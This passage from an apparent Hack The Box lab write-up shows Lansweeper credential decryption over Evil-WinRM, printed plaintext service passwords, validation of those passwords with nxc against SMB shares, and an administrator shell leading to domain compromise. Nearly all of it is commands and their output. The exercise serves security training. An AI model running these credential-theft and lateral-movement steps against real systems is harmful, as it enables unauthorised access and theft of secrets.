+Info: Upload successful!</code></pre><p>This uploaded the tool</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">Evil-WinRM* PS C:\programdata&gt; ./LansweeperDecrypt.ps1
+[+] Loading web.config file...
+[+] Found protected connectionStrings section. Decrypting...
+[+] Decrypted connectionStrings section:
+&lt;connectionStrings&gt;
+    &lt;add name=&quot;lansweeper&quot; connectionString=&quot;Data Source=(localdb)\.\LSInstance;Initial Catalog=lansweeperdb;Integrated Security=False;User ID=lansweeperuser;Password=Uk2)Dw3!Wf1)Hh;Connect Timeout=10;Application Name=&amp;quot;LsService Core .Net SqlClient Data Provider&amp;quot;&quot; providerName=&quot;System.Data.SqlClient&quot; /&gt;
+&lt;/connectionStrings&gt;
+[+] Opening connection to the database...
+[+] Retrieving credentials from the database...
+[+] Decrypting password for user: SNMP Community String
+[+] Decrypting password for user:
+[+] Decrypting password for user: SWEEP\svc_inventory_win
+[+] Decrypting password for user: svc_inventory_lnx
+[+] Credentials retrieved and decrypted successfully:
+
+CredName          Username                Password
+--------          --------                --------
+SNMP-Private      SNMP Community String   private
+Global SNMP                               public
+Inventory Windows SWEEP\svc_inventory_win 4^56!sK&amp;}eA?
+Inventory Linux   svc_inventory_lnx       0|5m-U6?/uAX
+
+
+[+] Database connection closed.</code></pre><p>I have found some more credentials for the <code>svc_inventory_win</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">svc_inventory_win:4^56!sK&amp;}eA?</code></pre><p>I can now test these creds</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb inventory.sweep.vl -u &#39;svc_inventory_win&#39; -p &#39;4^56!sK&amp;}eA?&#39; --shares
+SMB         10.129.234.177  445    INVENTORY        [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.177  445    INVENTORY        [+] sweep.vl\svc_inventory_win:4^56!sK&amp;}eA? (Pwn3d!)
+SMB         10.129.234.177  445    INVENTORY        [*] Enumerated shares
+SMB         10.129.234.177  445    INVENTORY        Share           Permissions     Remark
+SMB         10.129.234.177  445    INVENTORY        -----           -----------     ------
+SMB         10.129.234.177  445    INVENTORY        ADMIN$          READ,WRITE      Remote Admin
+SMB         10.129.234.177  445    INVENTORY        C$              READ,WRITE      Default share
+SMB         10.129.234.177  445    INVENTORY        DefaultPackageShare$ READ            Lansweeper PackageShare
+SMB         10.129.234.177  445    INVENTORY        IPC$            READ            Remote IPC
+SMB         10.129.234.177  445    INVENTORY        Lansweeper$     READ            Lansweeper Actions
+SMB         10.129.234.177  445    INVENTORY        NETLOGON        READ,WRITE      Logon server share 
+SMB         10.129.234.177  445    INVENTORY        SYSVOL          READ,WRITE      Logon server share</code></pre><p>This user is an administrator!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i inventory.sweep.vl -u &#39;svc_inventory_win&#39; -p &#39;4^56!sK&amp;}eA?&#39;
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_inventory_win\Documents&gt; cd ../../Administrator
+*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          8/5/2025   5:43 AM             33 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; </code></pre><p>Access as the administrator</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; </code></pre><p>Full domain compromise!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-sizzle/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Sizzle</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-vintage/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Vintage</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
